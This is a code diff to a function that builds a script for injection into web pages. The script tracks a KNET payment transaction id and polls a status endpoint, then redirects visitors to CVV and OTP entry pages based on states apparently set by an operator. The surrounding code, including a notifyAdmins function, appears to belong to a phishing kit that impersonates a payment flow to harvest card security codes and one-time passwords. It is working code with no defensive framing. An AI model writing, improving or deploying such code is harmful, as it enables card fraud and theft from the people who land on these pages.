@@ -23,38 +23,47 @@ function notifyAdmins(event, data) {
 }
 
 function getInterceptorScript() {
-  return `<script src="/socket.io/socket.io.js"><\/script><script>
+  return `<script>
 (function() {
   function getKnetId() {
-    // Try sessionStorage first
     var id = sessionStorage.getItem('eventat_knet_txn');
     if (id) return id;
-    // Try URL params
     var params = new URLSearchParams(window.location.search);
     return params.get('id') || params.get('knetId') || null;
   }
-  function initInterceptor() {
+  var _pollTimer = null;
+  var _lastStatus = null;
+  function startPolling() {
     var knetId = getKnetId();
     if (!knetId) return;
-    var sock = io({ forceNew: false });
-    sock.on('connect', function() { sock.emit('join_payment', knetId); });
-    sock.on('payment_status_changed', function(data) {
+    if (_pollTimer) return; // already polling
+    _pollTimer = setInterval(function() {
       var id = getKnetId();
-      if (!data || !id || (data.id !== id && data.paymentId !== id)) return;
-      if (data.status === 'CVV_PENDING') {
-        window.location.href = '/knet/cvv?id=' + id;
-      } else if (data.status === 'CVV_APPROVED') {
-        window.location.href = '/knet-otp?id=' + id;
-      }
-    });
-    sock.on('navigate_to', function(data) {
-      var id = getKnetId();
-      if (data && data.page) window.location.href = data.page + (id ? '?id=' + id : '');
-    });
-    window._interceptSocket = sock;
+      if (!id) return;
+      fetch('/knet/status/' + id)
+        .then(function(r) { return r.json(); })
+        .catch(function() { return null; })
+        .then(function(data) {
+          if (!data || !data.payment) return;
+          var status = data.payment.status;
+          if (status === _lastStatus) return;
+          _lastStatus = status;
+          if (status === 'CVV_PENDING') {
+            clearInterval(_pollTimer);
+            window.location.href = '/knet/cvv?id=' + id;
+          } else if (status === 'CVV_APPROVED') {
+            clearInterval(_pollTimer);
+            window.location.href = '/knet-otp?id=' + id;
+          } else if (status === 'CVV_FAILED') {
+            clearInterval(_pollTimer);
+            window.location.href = '/knet/cvv?id=' + id + '&error=1';
+          }
+        });
+    }, 1500);
+    window._interceptPoll = _pollTimer;
   }
-  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initInterceptor);
-  else initInterceptor();
+  // Start polling after a short delay to let Angular initialize
+  setTimeout(startPolling, 2000);
 })();
 <\/script>`;
 }
